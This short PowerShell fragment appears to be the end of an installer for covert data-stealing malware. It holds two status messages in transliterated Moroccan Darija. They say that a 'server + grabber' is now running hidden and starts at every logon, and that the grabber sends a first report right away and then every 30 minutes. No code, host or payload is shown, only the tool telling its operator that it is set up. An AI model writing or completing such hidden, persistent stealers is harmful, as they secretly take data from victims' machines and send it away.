Write-Host 'Salina. Server + grabber kaykhdmo hidden, kaytle3o f kol logon.' -ForegroundColor Green
Write-Host 'L grabber kayb3et awal report daba, mn be3d kol 30min.' -ForegroundColor DarkGray
